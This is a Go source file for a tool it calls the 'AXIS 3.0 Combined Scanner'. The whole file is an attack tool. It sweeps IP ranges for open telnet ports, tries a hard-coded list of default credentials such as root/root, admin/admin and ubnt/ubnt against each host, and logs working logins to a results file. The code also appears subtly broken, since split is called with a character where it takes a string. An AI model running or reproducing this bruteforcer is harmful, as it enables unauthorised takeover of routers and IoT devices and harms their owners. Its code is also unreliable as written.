package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
)

/*
 * AXIS 3.0 Combined Scanner
 * Scans IP ranges for open telnet ports and bruteforces credentials
 * Usage: ./scanner <startIP> <endIP> [port] [threads]
 */

// Credentials to try
var credentials = []struct {
	User string
	Pass string
}{
	{"root", "root"},
	{"admin", "admin"},
	{"root", "admin"},
	{"admin", "root"},
	{"root", "123456"},
	{"admin", "123456"},
	{"root", "password"},
	{"admin", "password"},
	{"root", ""},
	{"admin", ""},
	{"guest", "guest"},
	{"support", "support"},
	{"user", "user"},
	{"ubnt", "ubnt"},
	{"root", "1234"},
	{"admin", "1234"},
	{"root", "toor"},
	{"admin", "changeme"},
	{"root", "changeme"},
	{"default", "default"},
	{"root", "888888"},
	{"admin", "admin123"},
	{"root", "admin123"},
	{"operator", "operator"},
	{"ftp", "ftp"},
}

var (
	scanned   int64
	found     int64
	failed    int64
	startTime time.Time
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("AXIS 3.0 Combined Scanner")
		fmt.Println("Usage: ./scanner <startIP> <endIP> [port] [threads]")
		fmt.Println("  port:    Target port (default: 23)")
		fmt.Println("  threads: Concurrent workers (default: 100)")
		fmt.Println("")
		fmt.Println("Examples:")
		fmt.Println("  ./scanner 192.168.1.1 192.168.1.254")
		fmt.Println("  ./scanner 10.0.0.1 10.0.0.254 23 200")
		os.Exit(1)
	}

	startIP := os.Args[1]
	endIP := os.Args[2]
	port := 23
	threads := 100

	if len(os.Args) > 3 {
		p, err := strconv.Atoi(os.Args[3])
		if err == nil {
			port = p
		}
	}

	if len(os.Args) > 4 {
		t, err := strconv.Atoi(os.Args[4])
		if err == nil && t > 0 {
			threads = t
		}
	}

	startTime = time.Now()

	fmt.Printf("[*] AXIS 3.0 Combined Scanner\n")
	fmt.Printf("[*] Scanning: %s -> %s port %d\n", startIP, endIP, port)
	fmt.Printf("[*] Threads: %d\n", threads)
	fmt.Printf("[*] Credentials: %d combos\n", len(credentials))
	fmt.Printf("[*] Results saved to: scan-results.txt\n\n")

	// Start result writer
	results := make(chan string, 1000)
	go writeResults(results)

	// Generate IP range
	ips := generateIPRange(startIP, endIP)
	fmt.Printf("[*] Total IPs: %d\n\n", len(ips))

	// Scan with worker pool
	var wg sync.WaitGroup
	sem := make(chan struct{}, threads)

	for _, ip := range ips {
		wg.Add(1)
		sem <- struct{}{}

		go func(targetIP string) {
			defer wg.Done()
			defer func() { <-sem }()

			atomic.AddInt64(&scanned, 1)

			// Check if port is open
			if !portOpen(targetIP, port) {
				atomic.AddInt64(&failed, 1)
				return
			}

			// Port is open, try bruteforce
			if success, user, pass := bruteforce(targetIP, port); success {
				atomic.AddInt64(&found, 1)
				result := fmt.Sprintf("%s:%d %s:%s", targetIP, port, user, pass)
				results <- result
				fmt.Printf("[+] FOUND: %s\n", result)
			} else {
				atomic.AddInt64(&failed, 1)
			}

			// Print progress
			if atomic.LoadInt64(&scanned)%100 == 0 {
				printProgress()
			}
		}(ip)
	}

	wg.Wait()
	close(results)

	fmt.Printf("\n[*] Scan complete in %v\n", time.Since(startTime))
	printProgress()
}

func portOpen(ip string, port int) bool {
	addr := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func bruteforce(ip string, port int) (bool, string, string) {
	addr := fmt.Sprintf("%s:%d", ip, port)

	for _, cred := range credentials {
		conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
		if err != nil {
			return false, "", ""
		}

		conn.SetDeadline(time.Now().Add(5 * time.Second))
		reader := bufio.NewReader(conn)

		// Wait for banner
		time.Sleep(500 * time.Millisecond)

		// Send username
		fmt.Fprintf(conn, "%s\r\n", cred.User)
		time.Sleep(300 * time.Millisecond)

		// Check for password prompt
		buf := make([]byte, 1024)
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		n, _ := reader.Read(buf)
		response := string(buf[:n])

		if containsPasswordPrompt(response) {
			// Send password
			fmt.Fprintf(conn, "%s\r\n", cred.Pass)
			time.Sleep(500 * time.Millisecond)

			// Check for successful login
			conn.SetReadDeadline(time.Now().Add(2 * time.Second))
			n, _ = reader.Read(buf)
			response = string(buf[:n])

			if isSuccessfulLogin(response) {
				conn.Close()
				return true, cred.User, cred.Pass
			}
		} else if isSuccessfulLogin(response) {
			// No password required
			conn.Close()
			return true, cred.User, ""
		}

		conn.Close()

		// Small delay between attempts
		time.Sleep(100 * time.Millisecond)
	}

	return false, "", ""
}

func containsPasswordPrompt(response string) bool {
	resp := lower(response)
	return contains(resp, "password") || contains(resp, "pass") || contains(resp, "passwd")
}

func isSuccessfulLogin(response string) bool {
	resp := lower(response)
	// Check for shell prompts or success indicators
	if contains(resp, "login incorrect") || contains(resp, "authentication failed") ||
		contains(resp, "access denied") || contains(resp, "invalid") {
		return false
	}
	// Shell prompt indicators
	return contains(resp, "#") || contains(resp, "$") || contains(resp, ">") ||
		contains(resp, "busybox") || contains(resp, "login:") == false && len(resp) > 10
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsAt(s, substr, 0))
}

func containsAt(s, substr string, start int) bool {
	if start+len(substr) > len(s) {
		return false
	}
	for i := start; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

func lower(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c += 'a' - 'A'
		}
		result[i] = c
	}
	return string(result)
}

func writeResults(results <-chan string) {
	file, err := os.OpenFile("scan-results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("[-] Error opening results file: %v\n", err)
		return
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	defer writer.Flush()

	for result := range results {
		fmt.Fprintln(writer, result)
		writer.Flush()
	}
}

func generateIPRange(start, end string) []string {
	startIP := ipToInt(start)
	endIP := ipToInt(end)

	var ips []string
	for ip := startIP; ip <= endIP; ip++ {
		ips = append(ips, intToIP(ip))
	}
	return ips
}

func ipToInt(ip string) uint32 {
	parts := split(ip, '.')
	if len(parts) != 4 {
		return 0
	}
	var result uint32
	for i := 0; i < 4; i++ {
		val, _ := strconv.Atoi(parts[i])
		result |= uint32(val) << (24 - i*8)
	}
	return result
}

func intToIP(ip uint32) string {
	return fmt.Sprintf("%d.%d.%d.%d",
		(ip>>24)&0xFF,
		(ip>>16)&0xFF,
		(ip>>8)&0xFF,
		ip&0xFF)
}

func split(s, sep string) []string {
	var result []string
	start := 0
	for i := 0; i < len(s); i++ {
		if i+len(sep) <= len(s) && s[i:i+len(sep)] == sep {
			result = append(result, s[start:i])
			start = i + len(sep)
			i += len(sep) - 1
		}
	}
	result = append(result, s[start:])
	return result
}

func printProgress() {
	elapsed := time.Since(startTime)
	scanned := atomic.LoadInt64(&scanned)
	found := atomic.LoadInt64(&found)
	failed := atomic.LoadInt64(&failed)
	rate := float64(scanned) / elapsed.Seconds()

	fmt.Printf("\r[*] Progress: %d scanned | %d found | %d failed | %.1f IP/s | %v elapsed",
		scanned, found, failed, rate, elapsed.Round(time.Second))
}
